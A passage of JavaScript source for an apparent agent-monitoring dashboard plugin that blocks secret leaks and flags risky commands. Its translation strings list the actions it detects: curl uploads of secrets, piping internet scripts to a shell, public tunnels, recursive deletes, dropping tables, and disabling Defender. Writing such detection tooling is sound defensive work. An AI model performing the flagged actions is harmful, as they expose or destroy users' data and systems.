  const AGENT_ICON_B64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAFO0lEQVR4nO2cP2sUQRjGb49DgshqLeRAuwgpFIvEKpIyXUrBjxG4fIIc5GMIlulSBlOZFKJFwOsMXMDaBJEggciCG5bN7u3Mzr/nnXl+jfFPbmbn+c07s7tjBgNCCCGEpEjms7G1o+tbn+1J5nRzyUs2Thth4PhCOPlQBi9HBKsfxuDliZD5Dn56Mtq10WbMTNZv9nyJkLkOn4G7F8JEgsxV+G3Bb+0vT0zaTIHDnYuprgh9JchcB8/A7QthU4TMVvhn288uqx1l8Papj+/qwfljUwkyG+FXZz2D9ytCWzVQlWBo2hmG75/qJDPdZA9NZj/Dx5VA9dY8Mw2fJR9nSWhaDrqWgqHpzCc49KkE2nuAYrdffs3Zj0E1h2o+KiwsDyz98S8FWhWA676MSqCzRLcKwDd7cdGWp3IF4OyPswo0CsDZHydNuSpVAM7+eKuA8aNgIhsKkDj3BOD6Hzf1fDsrANf/uPcBXAIShwIkDgVIHAqQOBQgcShA4lCAxBkNhPL718/GM/EhefTkqdZpHARECYAYelv/pMgwkhr81Z+/AzTyhw/u9RldhKG08IvgEcNv6xt61YIWoDp4yMHXqfcVWQJYAcpBkxR8nWrfUSUYoocfA1fAEsAJEFv46BJACRBr+MgSwAiANCgpXS+MACWxzn7U64MQAGU2pHjdEAKgzo4UrhNKAJKgALHv/NHvCIILQMIi4m1gE+PnL1v/bv7jW3TtukJkBVgUgsrfS2s3agG+fJ9r/XvVQbYdxthRu7rXH5UAx59PtTZAuoNrS4Kx43Z1xyEKAVyHb/p9vtsNJUGQTaDNi135+PXu69m7V7Y+Nki7xbhsvFm7jLoCuAq/6feuWHHYru9K4FWAkGudJI49jtNQ6kW1zTrXVWDFU7u+JPAmgO+1TTobnsbL6xJACfDGyfsmkBIsJvq7gAJKgDMuwR4EUQKM8Qj6KJgShB+H4C+DXr8Y9/q+tqdvrp8Gziy32/f6oxGAhEW0APVZ5+tdwCxQuy4QeyIo9ODPBIcusgL0PW5lekxrHqhdX4gRoM+g2gphHqhdH4gSQGdwbYcwD9Sua8QJoDLIrkKYB2rXJWI3gaEGey4w5OgqALEHBUgcCpA4wQUof5Bi9YcspkD+/3pD/yDJ4AKQsEAJkEoVyIGuE+I2sCiDtv+f/IeDTwPbvN9+a/XzQpd/uAqANjtSuD6ICuCiCtierbZBmP1wFSD2O4IcZOcPK0DMEuSA4UMKEKMEOWj4sALUJZAqQl7pO2L40ALUB02SCHmtr6jhwwvQNHjIIuQNfUMOH+o2cBHlIFZvE1ElkBK8KAGaBjX0T9iUHLpYAaQPNiLwewDiFgqQOBQgcShA4lCAxKEAiUMBEqdTgMn6zV7x6+HOxdRLj4gVyrzK/JQFON1cyux0gSBSz5dLQOJQgMRREoD7gDjX/1YBuA+Ik6ZclZcAVoH4Zv9CAVgF4qItT61NIKtAXLO/U4Ama7b2lyfVxggGZR5lPqrVXPs2cPXg/O4oFiXAoJpDNR8VOgVoskenxBB/NOXStZdTfuy7dnR9W/+z6clot/y6qfQQfzO/T/haS0BXJeByIC98K4+CKQFe+Dpov/lrWgoKzrafXVY7xiXBPvXxbdvw6TzD6fXqt02C+r6ggCKYU19eF8163Qd4Ru/+dUQooRDdtO2nbAZfYnz4Y5EEi0Qg6nSt8yaP7a2c/umSoAqF6EZnY2f6zsbq8S8dEYgZtl7WOTn/RxHcYfstrdMDoBTBHq5ez3s9AUwh1OF5DEIIIQO3/AN947ipvZc6YgAAAABJRU5ErkJggg==";
/* mcp-secrets-guard — Hermes dashboard tab.
 * Plain IIFE, no build step. React + fetchJSON come from the host via
 * window.__HERMES_PLUGIN_SDK__. All text is rendered through React (auto-escaped);
 * no innerHTML anywhere. HTML reports open in a sandboxed iframe (no scripts). */
(function (SDK, onReady) {
  "use strict";
  if (!SDK || !SDK.React) return;
  const React = SDK.React;

  // ---- i18n & Language Management ----
  let currentLang = (function () {
    try {
      const saved = typeof localStorage !== "undefined" && localStorage
        ? (localStorage.getItem("msg_guard_lang") || localStorage.getItem("msg_lang"))
        : null;
      if (saved === "ru" || saved === "en") return saved;
      const l = (typeof navigator !== "undefined" && ((navigator.languages && navigator.languages[0]) || navigator.language)) || "";
      return /^(ru|uk|be)\b/i.test(l) ? "ru" : "en";
    } catch (e) { return "en"; }
  })();

  const langListeners = new Set();
  function setLanguage(lang) {
    if (lang !== "ru" && lang !== "en") return;
    currentLang = lang;
    try {
      if (typeof localStorage !== "undefined" && localStorage) {
        localStorage.setItem("msg_guard_lang", lang);
        localStorage.setItem("msg_lang", lang);
      }
    } catch (e) {}
    try { post("/config", { lang: lang }).catch(function () {}); } catch (e) {}
    langListeners.forEach(function (fn) { try { fn(lang); } catch (e) {} });
  }

  /* I18N_RU_BEGIN */
  const I18N_RU = {
    "Live protection": "Защита",
    "live protection": "защита в реальном времени",
    "Live protection (#)": "Защита (#)",
    "Protection": "Защита",
    "Ports": "Порты",
    "Code Inspector": "Проверка кода",
    "Vault": "Сейф",
    "Settings": "Настройки",
    "Exposure": "Порты",
    "network exposure": "открытые порты",
    "Exposure score ": "Оценка защищенности портов ",
    "Port security score ": "Оценка защищенности портов ",
    "Exposure score #/100": "Оценка защищенности портов #/100",
    "Port security score #/100": "Оценка защищенности портов #/100",
    "Exposure score 86/100": "Оценка защищенности портов 86/100",
    "safe listeners": "безопасные",
    " critical · ": " критичных · ",
    " high · ": " высоких · ",
    " medium · ": " средних · ",
    " low": " низких",
    "# actions blocked": "Заблокировано действий: #",
    "# action blocked": "Заблокировано действие",
    "  An agent tried to send sensitive data. Decide below what should happen.": "  Агент пытался отправить важные данные. Решите ниже, что делать.",
    "  Every agent action is checked for secrets before it runs.": "  Каждое действие агента проверяется на секреты до запуска.",
    "Protected": "Защищено",
    "Last check ": "Последняя проверка: ",
    "Last check 0s ago": "Проверено только что",
    "0s ago": "только что",
    "just now": "только что",
    "s ago": " с назад",
    " min ago": " мин назад",
    " h ago": " ч назад",
    " d ago": " дн назад",
    " attempts": " попыток",
    "Agent ": "Агент ",
    "session ": "сеанс ",
    "an agent": "агент",
    "vault · your secrets, encrypted": "сейф · ваши секреты, зашифрованы",
    "Add a file": "Добавить файл",
    "Up to 10 MB: .env, keys, wallet files, documents.": "До 10 МБ: .env, ключи, файлы кошельков, документы.",
    "Protected: #": "Под защитой: #",
    "Protected: ": "Под защитой: ",
    "Trash (": "Корзина (",
    "Trash (#)": "Корзина (#)",
    "Restore": "Восстановить",
    "Restored.": "Восстановлено.",
    "Delete forever": "Удалить навсегда",
    "Delete forever? This cannot be undone.": "Удалить навсегда? Это нельзя отменить.",
    "Deleted forever.": "Удалено навсегда.",
    "file": "файл",
    "text": "текст",
    "New name": "Новое название",
    "New value": "Новое значение",
    "Save": "Сохранить",
    "Cancel": "Отмена",
    "Rename": "Переименовать",
    "Renamed.": "Переименовано.",
    "Change kind": "Сменить категорию",
    "Kind changed.": "Категория изменена.",
    "Replace value": "Заменить значение",
    "Value replaced. Agents keep the same token.": "Значение заменено. Токен для агентов прежний.",
    "Save a copy to Downloads": "Сохранить копию в «Загрузки»",
    "Saved a copy to Downloads.": "Копия сохранена в «Загрузки».",
    "Move to trash": "В корзину",
    "Move to trash? You can restore it later.": "В корзину? Его можно восстановить позже.",
    "Moved to the trash.": "Перемещено в корзину.",
    "quarantined from an agent": "перехвачено у агента",
    "added by you": "добавлено вами",
    "Undo": "Отменить",
    "undone": "отменено",
    "Everything runs on this computer. Secret values are never shown or sent.": "Всё работает на этом компьютере. Секреты никогда не показываются и не отправляются.",
    "No incidents yet.": "Инцидентов пока нет.",
    "No incidents yet": "Инцидентов пока нет",
    "Hold to show the full value": "Удерживайте, чтобы увидеть значение целиком",
    "Could not show the value.": "Не удалось показать значение.",
    "Unknown finding.": "Неизвестная находка.",
    "This value was not stored in the vault, so it cannot be shown.": "Это значение не сохранено в сейфе, поэтому его нельзя показать.",
    "The value is no longer in the vault.": "Этого значения больше нет в сейфе.",
    "🔒 Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "🔒 Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
    "Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
    "Safer: ": "Безопаснее: ",
    "Safer: Use --host 127.0.0.1": "Безопаснее: Используйте --host 127.0.0.1",
    "Use --host 127.0.0.1 (or bind to localhost) unless other devices really need it.": "Используйте --host 127.0.0.1 (или привязку к localhost), если другим устройствам действительно не нужен доступ.",
    "Keep OLLAMA_HOST=127.0.0.1.": "Сохраняйте OLLAMA_HOST=127.0.0.1.",
    "Use -p 127.0.0.1:PORT:PORT.": "Используйте -p 127.0.0.1:ПОРТ:ПОРТ.",
    "Add --bind 127.0.0.1, and never run it in a folder with secrets.": "Добавьте --bind 127.0.0.1 и никогда не запускайте сервер в папке с секретами.",
    "Only open a tunnel you started yourself, with a password, and close it after use.": "Открывайте только туннели, созданные вами лично, защищайте паролем и закрывайте после использования.",
    "Ask the user first; open only the exact port for the exact program.": "Сначала спросите пользователя; открывайте только точный порт для конкретной программы.",
    "Use a VPN instead of exposing Remote Desktop.": "Используйте VPN вместо открытия Remote Desktop в сеть.",
    "Delete only an exact path the user named, and prefer moving to a trash folder.": "Удаляйте только указанный пользователем точный путь и отдавайте предпочтение перемещению в корзину.",
    "Take a backup first and confirm the exact table with the user.": "Сначала сделайте резервную копию и уточните у пользователя точное имя таблицы.",
    "Use --force-with-lease, or ask the user first.": "Используйте --force-with-lease или сначала спросите пользователя.",
    "Download the script first, read it, then run it.": "Сначала скачайте скрипт, изучите его содержимое и только потом запускайте.",
    "Do not let an agent change antivirus settings.": "Не позволяйте агенту изменять настройки антивируса.",
    "If you turn it off: Other computers will no longer be able to access files and printers shared from this PC.": "Если отключить: Другие компьютеры больше не смогут получать доступ к общим файлам и принтерам на этом ПК.",
    "If you turn it off: ASUS software will stop communicating with the router or motherboard utility.": "Если отключить: Программы ASUS перестанут связываться с утилитой материнской платы или роутера.",
    "If you turn it off: ": "Если отключить: ",
    "Starts a server open to the whole network": "Запускает сервер, открытый для всей сети",
    "Exposes Ollama to the network": "Открывает доступ к Ollama из локальной сети",
    "Publishes a container port on all interfaces": "Публикует порт контейнера на всех сетевых интерфейсах",
    "Shares a folder over HTTP": "Открывает общий доступ к папке по HTTP",
    "Opens a public internet tunnel": "Создаёт публичный интернет-туннель",
    "Opens a port in the firewall or turns the firewall off": "Открывает порт в брандмауэре или отключает его",
    "Enables Remote Desktop": "Включает удалённый рабочий стол (RDP)",
    "Deletes files recursively": "Рекурсивно удаляет файлы и папки",
    "Destroys database data": "Уничтожает данные в базе данных",
    "Overwrites git history on the server": "Перезаписывает историю git на сервере (force push)",
    "Runs a script straight from the internet": "Запускает скрипт напрямую из интернета (pipe to shell)",
    "Turns off antivirus protection": "Отключает антивирусную защиту Windows Defender",
    "The service will accept connections from any device on the network, and from the internet if the router forwards the port.": "Сервис будет принимать подключения с любого устройства в сети, а при пробросе портов — из интернета.",
    "Anyone on the network could run, pull or delete your local AI models.": "Любой пользователь в сети сможет запускать, скачивать или удалять ваши локальные ИИ-модели.",
    "docker -p without an address publishes the port to every network and bypasses Windows Firewall in many setups.": "docker -p без указания адреса публикует порт на всех интерфейсах и часто обходит брандмауэр Windows.",
    "python -m http.server serves the whole folder to the network by default.": "python -m http.server по умолчанию открывает доступ ко всей текущей папке для всех устройств в сети.",
    "Tunnels (ngrok, cloudflared, localtunnel, bore) publish a local service on the internet, bypassing the router and firewall.": "Туннели (ngrok, cloudflared, localtunnel) делают локальный сервис доступным из интернета в обход роутера и брандмауэра.",
    "Changes what the internet can reach on this computer.": "Изменяет правила доступа из интернета к службам на этом компьютере.",
    "Remote Desktop is the most attacked service on the internet.": "Удалённый рабочий стол — самый часто атакуемый сервис в сети.",
    "This permanently deletes a folder tree. Agents have wiped projects and home folders this way.": "Это безвозвратно удаляет дерево каталогов. Агенты неоднократно стирали проекты таким способом.",
    "DROP / TRUNCATE / DELETE without WHERE removes data permanently.": "DROP / TRUNCATE / DELETE без условия WHERE безвозвратно уничтожают таблицы.",
    "A force push can erase other people's work and published history.": "Force push может стереть чужие коммиты и перезаписать историю репозитория.",
    "Downloading and executing code in one step runs whatever the server sends, with your permissions.": "Скачивание и запуск кода в одну строчку выполняет любой присланный сервером код с вашими правами.",
    "Disabling Defender removes protection against malware.": "Отключение Defender лишает систему защиты от вредоносных программ.",
    "Safer:": "Безопаснее:",
    "(via curl)": "(через curl)",
    "Protect & send": "Защитить и отправить",
    "Block & quarantine": "Заблокировать и изолировать",
    "Allow once": "Разрешить один раз",
    "⛔ Block": "⛔ Заблокировать",
    "🛡 Protect & send": "🛡 Защитить и отправить",
    "GitHub access token": "Токен доступа GitHub",
    "terminal": "терминал",
    "shell: curl": "команда: curl",
    "shell: ollama": "команда: ollama",
    "incident history": "история инцидентов",
    "Check code": "Проверить код",
    "Checking…": "Проверка…",
    "Load example": "Пример скрипта",
    "Open full report": "Полный отчёт",
    "Close report": "Закрыть отчёт",
    "Full report": "Полный отчёт",
    "Credentials": "Учётные данные",
    "Financial": "Финансовые данные",
    "PII": "Персональные данные",
    "Health": "Медицинские данные",
    "Location": "Данные о геолокации",
    "Password, API key or token": "Пароль, API-ключ или токен",
    "Card or bank account": "Банковская карта или счёт",
    "Personal data (name, phone, email)": "Персональные данные (ФИО, телефон, email)",
    "Medical data": "Медицинские данные",
    "Location data": "Геолокация и координаты",
    "Protect this secret": "Защитить этот секрет",
    "Encrypting…": "Шифрование…",
    "Secret name (e.g. OpenAI Key, Visa Card)": "Название секрета (например: Ключ OpenAI, Карта Visa)",
    "Paste the secret value": "Значение секрета (пароль, токен, ключ)",
    "Check again": "Проверить снова",
    "Scanning…": "Сканирование…",
    "port": "порт",
    "(pid": "(pid",
    "What to do:": "Рекомендация:",
    "Nothing risky is open to the network.": "Опасных портов в сети не обнаружено.",
    "Open to every network": "Открыт для всей сети",
    "Open to this local network": "Открыт для локальной сети",
    "Only this computer": "Только для этого компьютера",
    "Critical": "Критический",
    "High": "Высокий",
    "Medium": "Средний",
    "Low": "Низкий",
    "Safe": "Безопасный",
    "mcp-secrets-guard blocked an agent": "mcp-secrets-guard заблокировал агента",
    "mcp-secrets-guard": "mcp-secrets-guard"
  };
  /* I18N_RU_END */

  const I18N_EN = {
    "Защита": "Protection",
    "Порты": "Ports",
    "Проверка кода": "Code Inspector",
    "Сейф": "Vault",
    "Настройки": "Settings",
    "Ожидает решения": "Pending",
    "Заблокировано": "Blocked, secret quarantined",
    "Разрешено": "Allowed once",
    "Защищено": "Protected & sent",
    "Инцидентов пока нет.": "No incidents yet.",
    "Все": "All",
    "Удалить навсегда": "Delete forever",
    "В корзину": "Move to trash",
    "Восстановить": "Restore",
    "Переименовать": "Rename",
    "Сменить категорию": "Change kind",
    "Заменить значение": "Replace value",
    "Сохранить копию в «Загрузки»": "Save a copy to Downloads",
    "Безопаснее: ": "Safer: ",
    "Защитить и отправить": "Protect & send",
    "Заблокировать и изолировать": "Block & quarantine",
    "Разрешить один раз": "Allow once",
    "⛔ Заблокировать": "⛔ Block",
    "🛡 Защитить и отправить": "🛡 Protect & send",
    "Проверить код": "Check code",
    "Пример скрипта": "Load example",
    "Полный отчёт": "Open full report",
    "Закрыть отчёт": "Close report",
    "Защитить этот секрет": "Protect this secret",
    "Шифрование…": "Encrypting…",
    "Проверить снова": "Check again",
    "Сканирование…": "Scanning…",
    "Очистить историю": "Clear history"
  };

  function lookup(s) {
    if (Object.prototype.hasOwnProperty.call(I18N_RU, s)) return I18N_RU[s];
    const nums = s.match(/\d+/g);
    if (nums) {
      const k = s.replace(/\d+/g, "#");
      if (Object.prototype.hasOwnProperty.call(I18N_RU, k)) {
        let i = 0;
        return I18N_RU[k].replace(/#/g, function () { return nums[i++]; });
      }
    }
    return null;
  }

  function T(s) {
    if (typeof s !== "string" || !s) return s;
    if (currentLang === "ru") {
      const whole = lookup(s);
      if (whole !== null) return whole;
      const m = s.match(/^([^A-Za-z(]*)([\s\S]*?)([\s.:·…]*)$/);
      if (m && m[2]) {
        const core = lookup(m[2]);
        if (core !== null) return m[1] + core + m[3];
      }
      if (s.indexOf("(via ") !== -1) return s.replace(/\(via\s+([^)]+)\)/g, "(через $1)");
      if (s.indexOf("Safer: ") !== -1) return s.replace(/Safer:\s*/g, "Безопаснее: ");
      if (s.indexOf("Exposure score ") !== -1) return s.replace(/Exposure score\s*/g, "Оценка защищенности портов ");
      return s;
    } else {
      if (Object.prototype.hasOwnProperty.call(I18N_EN, s)) return I18N_EN[s];
      if (s.indexOf("Безопаснее: ") !== -1) return s.replace(/Безопаснее:\s*/g, "Safer: ");
      if (s.indexOf("(через ") !== -1) return s.replace(/\(через\s+([^)]+)\)/g, "(via $1)");
      return s;
    }
  }

  const h = function (type, props) {
    const kids = Array.prototype.slice.call(arguments, 2).map(function (c) {
      return typeof c === "string" ? T(c) : c;
    });
    if (props && (props.placeholder || props.title) && typeof type === "string") {
      props = Object.assign({}, props,
        props.placeholder ? { placeholder: T(props.placeholder) } : null,
        props.title && type !== "iframe" ? { title: T(props.title) } : null);
    }
    return React.createElement.apply(null, [type, props].concat(kids));
  };

  const { useState, useEffect, useCallback, useRef } = React;
  const API = "/api/plugins/yadro-guard";
  const POLL_MS = 4000;
  const TOAST_MS = 20000;

  function post(path, body) {
    return SDK.fetchJSON(API + path, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Mcp-Secrets-Guard": "1" },
      body: JSON.stringify(body),
    });
  }

  function ago(ts) {
    if (!ts) return "";
    const s = Math.max(0, Math.floor(Date.now() / 1000 - ts));
    if (s < 60) return currentLang === "ru" ? "только что" : "just now";
    if (s < 3600) return Math.floor(s / 60) + (currentLang === "ru" ? " мин назад" : " min ago");
    if (s < 86400) return Math.floor(s / 3600) + (currentLang === "ru" ? " ч назад" : " h ago");
    return Math.floor(s / 86400) + (currentLang === "ru" ? " дн назад" : " d ago");
  }

  function fmtTs(ts) {
    if (!ts) return "";
    const d = new Date(ts * 1000), p = function (n) { return (n < 10 ? "0" : "") + n; };
    return p(d.getDate()) + "." + p(d.getMonth() + 1) + "." + d.getFullYear() +
      " " + p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
  }

  function copyText(text, okLabel) {
    if (!text) return;
    const show = function () {
      var el = document.createElement("div");
      el.textContent = okLabel || (currentLang === "ru" ? "Скопировано в буфер" : "Copied to clipboard");
      el.style.cssText = "position:fixed; bottom:60px; right:16px; z-index:9999; background:#111a28; color:#00f0ff; padding:8px 14px; border-radius:6px; font:12px monospace; border:1px solid #00f0ff; box-shadow:0 0 15px rgba(0,240,255,0.4);";
      document.body.appendChild(el);
      setTimeout(function () { el.remove(); }, 1800);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(show).catch(function () {});
      return;
    }
    var ta = document.createElement("textarea"); ta.value = text; document.body.appendChild(ta);
    ta.select(); try { document.execCommand("copy"); show(); } catch (e) {} ta.remove();
  }

  function blobDownload(name, text, type) {
    var blob = new Blob([text], { type: type || "text/plain;charset=utf-8" });
    var url = URL.createObjectURL(blob);
    var a = document.createElement("a"); a.href = url; a.download = name; document.body.appendChild(a);
    a.click(); URL.revokeObjectURL(url); a.remove();
  }

  function sha256(text) {
    var enc = new TextEncoder().encode(text);
    if (window.crypto && window.crypto.subtle) {
      return window.crypto.subtle.digest("SHA-256", enc).then(function (buf) {
        return [].map.call(new Uint8Array(buf), function (b) { return (b < 16 ? "0" : "") + b.toString(16); }).join("");
      });
    }
    var h1 = 0x811c9dc5, h2 = 0x9e3779b9;
    for (var i = 0; i < text.length; i++) { var c = text.charCodeAt(i); h1 = ((h1 ^ c) * 16777619) >>> 0; h2 = Math.imul(h2 ^ c, 16777619) >>> 0; }
    return Promise.resolve("x" + h1.toString(16) + h2.toString(16));
  }

  function proofFooter(hash, when) {
    if (currentLang === "ru") {
      return "\n\n———————————————— PROOF SEAL ————————————————\nSHA-256 отчёта: " + hash + "\nВремя генерации: " + when + "\nЦелостность: подтверждена (локально, без облака).\n";
    }
    return "\n\n———————————————— PROOF SEAL ————————————————\nReport SHA-256: " + hash + "\nGenerated at: " + when + "\nIntegrity: Verified locally (zero cloud).\n";
  }

  function getStatusText(status) {
    if (currentLang === "ru") {
      var ru = { pending: "Ожидает решения", quarantined: "Заблокировано", blocked: "Заблокировано", allowed: "Разрешено", protected: "Защищено" };
      return ru[status] || status;
    }
    var en = { pending: "Pending decision", quarantined: "Blocked, secret quarantined", blocked: "Blocked", allowed: "Allowed once", protected: "Protected & sent" };
    return en[status] || status;
  }

  function miniReport(inc, kind) {
    const ts = Math.floor(Date.now() / 1000);
    const when = fmtTs(ts);
    const body = (kind === "json")
      ? JSON.stringify({ incident: inc, generated: ts }, null, 2)
      : [
          currentLang === "ru" ? "mcp-secrets-guard — протокол инцидента" : "mcp-secrets-guard — Incident Report",
          "ID: " + inc.id,
          (currentLang === "ru" ? "Статус: " : "Status: ") + getStatusText(inc.status),
          (currentLang === "ru" ? "Время (локальное): " : "Local Time: ") + fmtTs(inc.at),
          (currentLang === "ru" ? "Агент: " : "Agent: ") + (inc.agent && (inc.agent.chat_title || inc.agent.session_id) ? (inc.agent.chat_title || inc.agent.session_id) : ""),
          (currentLang === "ru" ? "Инструмент: " : "Tool: ") + (inc.tool || ""),
          (currentLang === "ru" ? "Назначение: " : "Destination: ") + (inc.destination || ""),
        ].join("\n") + (inc.command ? "\nCommand:\n" + inc.command : (inc.risks && inc.risks[0] ? "\nSnippet:\n" + (inc.risks[0].snippet || "") : ""));
    sha256(body).then(function (hash) {
      var out = body + proofFooter(hash, when);
      blobDownload("incident-" + inc.id + "." + (kind === "json" ? "json" : "txt"), out, kind === "json" ? "application/json" : "text/plain;charset=utf-8");
    });
  }

  function escHtml(s) {
    return String(s == null ? "" : s).replace(/[&<>]/g, function (c) {
      return c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;";
    });
  }

  // ---- DYNAMIC HERMES SESSION RESOLVER (ZERO HARDCODING) ----
  var _sessionTitlesCache = {};
  var _titleListeners = new Set();
  var _titlesFetched = false;

  function loadDynamicSessionTitles() {
    try {
      if (!SDK || !SDK.fetchJSON) return;
      SDK.fetchJSON(API + "/sessions/titles")
        .then(function (r) {
          if (r && r.status === "ok" && r.titles) {
            Object.keys(r.titles).forEach(function (k) {
              var t = String(r.titles[k] || "").trim();
              if (t) {
                _sessionTitlesCache[k] = t;
                var shortK = String(k).slice(-6);
                _sessionTitlesCache[shortK] = t;
              }
            });
            if (r.active_title) {
              _sessionTitlesCache["__latest__"] = r.active_title;
              if (r.active_id) {
                _sessionTitlesCache[r.active_id] = r.active_title;
                _sessionTitlesCache[String(r.active_id).slice(-6)] = r.active_title;
              }
            }
            _titlesFetched = true;
            _titleListeners.forEach(function (fn) { try { fn(_sessionTitlesCache); } catch (e) {} });
          }
        })
        .catch(function () {});
    } catch (e) {}
  }

  // Preload session titles immediately on module evaluation
  try { setTimeout(loadDynamicSessionTitles, 100); } catch (e) {}

  function parseHermesSidebarTitles() {
    var found = {};
    function scan(doc) {
      if (!doc) return;
      try {
        var sel = [
          "a[href*='/chat/']",
          "a[href*='/session/']",
          "a[href*='chat']",
          "[data-session-id]",
          "[data-chat-id]",
          "[data-id]",
          ".session-item",
          ".chat-item",
          ".sidebar-item",
          ".sidebar-nav a",
          "nav a",
          "nav button",
          "[role='navigation'] a",
          "[role='navigation'] button",
          "[data-testid*='session']",
          "[data-testid*='chat']",
          "[class*='session']",
          "[class*='chat']"
        ].join(", ");
        var els = doc.querySelectorAll(sel);
        for (var i = 0; i < els.length; i++) {
          var el = els[i];
          var href = el.getAttribute("href") || "";
          var sid = el.getAttribute("data-session-id") || el.getAttribute("data-chat-id") || el.getAttribute("data-id") || (el.dataset && (el.dataset.sessionId || el.dataset.chatId || el.dataset.id)) || "";
          if (!sid && href) {
            var m = href.match(/(?:chat|session)[s]?\/([a-zA-Z0-9_\-]+)/);
            if (m) sid = m[1];
          }
          var raw = el.innerText || el.textContent || el.getAttribute("title") || el.getAttribute("aria-label") || "";
          var text = raw.replace(/\s+/g, " ").trim();
          text = text.replace(/^(?:chat|чат)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim();
          if (sid && text) {
            found[sid] = text;
            found[String(sid).slice(-6)] = text;
          }
        }
      } catch (e) {}
    }
    scan(document);
    try { if (window.parent && window.parent !== window && window.parent.document) scan(window.parent.document); } catch (e) {}
    try { if (window.top && window.top !== window && window.top.document) scan(window.top.document); } catch (e) {}
    return found;
  }

  function resolveChatTitle(sessionId) {
    if (!sessionId) {
      var latest = _sessionTitlesCache["__latest__"];
      if (latest) {
        var cLatest = String(latest).replace(/^(?:чат|chat)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim();
        return {
          title: currentLang === "ru" ? ("«" + cLatest + "»") : ("\"" + cLatest + "\""),
          raw: cLatest,
          id: "latest"
        };
      }
      return {
        title: currentLang === "ru" ? "«Архивный сеанс»" : "\"Archived session\"",
        raw: currentLang === "ru" ? "Архивный сеанс" : "Archived session",
        id: "—"
      };
    }
    var sidStr = String(sessionId);
    var shortId = sidStr.slice(-6);

    // 1. Check in-memory SQLite / API cache
    var title = _sessionTitlesCache[sidStr] || _sessionTitlesCache[shortId];

    // 2. If not yet cached, attempt live DOM parsing of Hermes sidebar
    if (!title) {
      var domTitles = parseHermesSidebarTitles();
      Object.assign(_sessionTitlesCache, domTitles);
      title = _sessionTitlesCache[sidStr] || _sessionTitlesCache[shortId];
    }

    // 3. If still not cached, trigger async background fetch from /sessions/titles
    if (!title && !_titlesFetched) {
      loadDynamicSessionTitles();
    }

    // 4. Fallback to latest known chat title from Hermes if available
    if (!title && _sessionTitlesCache["__latest__"]) {
      title = _sessionTitlesCache["__latest__"];
    }

    var cleanTitle = title ? String(title).replace(/^(?:чат|chat)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim() : "";
    var fallback = currentLang === "ru" ? ("Сеанс #" + shortId) : ("Session #" + shortId);
    var outRaw = cleanTitle || fallback;
    var outTitle = currentLang === "ru" ? ("«" + outRaw + "»") : ("\"" + outRaw + "\"");

    return { title: outTitle, raw: outRaw, id: sidStr };
  }

  // Multi-line SVG text wrapper to prevent clipping or ellipsis
  function renderWrappedText(text, x, y, maxLineLen, maxLines, fontSize, fill, fontWeight) {
    if (!text) return null;
    var raw = String(text);
    var lines = [];
    if (raw.indexOf("/") !== -1 && raw.length > maxLineLen) {
      var parts = raw.split("/");
      if (parts.length >= 3 && parts[0].indexOf("http") !== -1) {
        lines = [parts[0] + "//" + parts[2], "/" + parts.slice(3).join("/")];
      }
    }
    if (lines.length === 0) {
      var words = raw.split(" ");
      var cur = "";
      for (var i = 0; i < words.length; i++) {
        var w = words[i];
        if (!cur) {
          cur = w;
        } else if ((cur + " " + w).length <= maxLineLen) {
          cur += " " + w;
        } else {
          lines.push(cur);
          cur = w;
          if (lines.length >= maxLines - 1) {
            for (var k = i + 1; k < words.length; k++) {
              cur += " " + words[k];
            }
            break;
          }
        }
      }
      if (cur && lines.length < maxLines) lines.push(cur);
      if (lines.length === 0 && raw) {
        for (var j = 0; j < raw.length && lines.length < maxLines; j += maxLineLen) {
          lines.push(raw.slice(j, j + maxLineLen));
        }
      }
    }
    var lineH = fontSize * 1.35;
    return h("text", {
      x: x, y: y, textAnchor: "middle", fill: fill,
      fontSize: fontSize, fontWeight: fontWeight || 400
    }, lines.map(function (ln, idx) {
      return h("tspan", { x: x, dy: idx === 0 ? 0 : lineH, key: idx }, ln);
    }));
  }

  function passportText(inc, exp, vlt) {
    var L = [];
    var items = (inc && inc.items) || [];
    var pend = items.filter(function (i) { return i.status === "pending"; });
    var quar = items.filter(function (i) { return i.status === "quarantined" || i.status === "blocked"; });
    var allo = items.filter(function (i) { return i.status === "allowed" || i.status === "protected"; });
    if (currentLang === "ru") {
      L.push("mcp-secrets-guard — ПАСПОРТ БЕЗОПАСНОСТИ ПК");
      L.push("Сформирован: " + fmtTs(Math.floor(Date.now() / 1000)));
      L.push("============================================================");
      L.push("");
      L.push("1. ЗАЩИТА — перехват секретов до запуска");
      L.push("   Ожидают решения:        " + pend.length);
      L.push("   Всего инцидентов:       " + items.length);
      L.push("   Заблокировано/карантин: " + quar.length);
      L.push("   Разрешено/с защитой:    " + allo.length);
      L.push("");
      L.push("2. ОТКРЫТЫЕ ПОРТЫ — сетевая безопасность");
      if (exp && exp.status === "ok") {
        var c = exp.counts || {};
        L.push("   Оценка защищенности портов: " + (exp.score != null ? exp.score : "?") + "/100");
        L.push("   Критических: " + (c.critical || 0) + " · Высоких: " + (c.high || 0) + " · Средних: " + (c.medium || 0) + " · Низких: " + (c.low || 0));
      }
      L.push("");
      L.push("3. СЕЙФ — защищённые секреты");
      var vItems = (vlt && vlt.items) || [];
      var liveV = vItems.filter(function (v) { return !v.deleted; });
      L.push("   Секретов в хранилище: " + liveV.length);
    } else {
      L.push("mcp-secrets-guard — PC SECURITY PASSPORT");
      L.push("Generated: " + fmtTs(Math.floor(Date.now() / 1000)));
      L.push("============================================================");
      L.push("");
      L.push("1. PROTECTION — Intercepting secrets before execution");
      L.push("   Pending decision:       " + pend.length);
      L.push("   Total incidents:        " + items.length);
      L.push("   Blocked/quarantined:    " + quar.length);
      L.push("   Allowed/protected:      " + allo.length);
      L.push("");
